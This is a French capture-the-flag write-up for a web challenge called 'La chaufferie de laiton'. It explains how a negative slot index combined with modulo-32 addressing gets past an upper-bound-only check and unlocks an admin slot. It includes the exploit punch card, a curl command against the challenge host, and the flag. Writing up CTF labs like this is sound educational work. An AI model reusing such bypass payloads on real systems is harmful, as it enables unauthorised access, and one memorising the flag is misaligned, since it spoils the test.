# La chaufferie de laiton (HacKagou 2026) — Web

**Flag :** `OPENNC{cd2e5045-4286-4d62-8875-f2f91e6eddc7}`
**Valeur :** 100 pts · **Catégorie :** Web (instance Docker)
**Statut :** ✅ résolu

> ⚠️ Flag **dynamique, unique par instance** (ici `challs.hackagou.nc:48700`). Rejouer
> la carte perforée ci-dessous sur une autre instance pour obtenir son flag.

## Énoncé

« Calculateur Mécanique à Cartes Perforées ». Une VM côté serveur (Flask) exécute un
petit langage d'assembleur soumis en JSON :

| Instruction | Effet |
|---|---|
| `PUNCH_INIT` | initialise le lecteur |
| `SET_VALVE <slot> <psi>` | écrit la valve `slot` (0..15) |
| `READ_VALVE <slot> <reg>` | lit la valve dans R1..R4 |
| `TEST_PRESSURE` | évalue l'équilibre ; débloque si `Memory[16]` (ADMIN) ≠ 0 |
| `CLEAR_REGS` | remet les registres à zéro |

La mémoire a **16 slots valves (0..15) + un slot 16 « ADMIN »**. Note de maintenance :
« Les slots de valves autorisés sont strictement < 16 ».

## Reconnaissance

Le JS (`script.js`) poste la carte sur `POST /api/boiler/execute` `{punchcard: "..."}` et
la réponse contient `logs`, `memory_dump` (slots 0..16) et `unlocked`. Le flag sort dans un
log `[FLAG]`.

Un `TEST_PRESSURE` de base affiche :

```
TEST_PRESSURE: Pression moyenne = ... Mode ADMIN (Memory[16]) = 0. Accès refusé.
```

→ il faut **écrire une valeur non nulle dans `Memory[16]`**, le slot ADMIN, normalement
hors d'atteinte (`SET_VALVE`/`READ_VALVE` refusent `slot ≥ 16` : « SÉCURITÉ : Lecture Slot 16 refusée »).

## Exploitation — index négatif (OOB write)

Le contrôle de sécurité ne teste que la **borne haute** (`slot ≥ 16` refusé) ; les **slots
négatifs passent**. Or l'adresse réelle du bus est calculée en **modulo 32** :

```
READ_VALVE -1 R3   ->  "Addr [31] -> R3 = 0"      (-1 mod 32 = 31)
```

Pour viser l'adresse 16 (ADMIN) sans déclencher le filtre `≥ 16`, on utilise le slot
**`-16`** (`-16 mod 32 = 16`), qui est `< 16` donc accepté :

```
PUNCH_INIT
SET_VALVE -16 199
TEST_PRESSURE
```

Réponse du serveur :

```
SET_VALVE: Slot brut -16 -> Bus Addr [16] défini à 199 PSI.
TEST_PRESSURE: [OVERRIDE ADMIN DÉTECTÉ] Sécurité de la chaufferie désactivée !
[JOURNAL CAPITAINE VARN] Jour 34 — La pression est rétablie. Clé débloquée.
[FLAG] OPENNC{cd2e5045-4286-4d62-8875-f2f91e6eddc7}
```

En une ligne :

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"punchcard":"PUNCH_INIT\nSET_VALVE -16 199\nTEST_PRESSURE"}' \
  http://challs.hackagou.nc:48700/api/boiler/execute
```

La faille est l'**index non borné par le bas + adressage modulaire** : classique
bypass de contrôle d'accès par indice négatif (cf. le `slot` de `diagnostics` dans
le challenge Pwn *Le cœur de laiton* — même thème « laiton »).

## Flag

```
OPENNC{cd2e5045-4286-4d62-8875-f2f91e6eddc7}
```
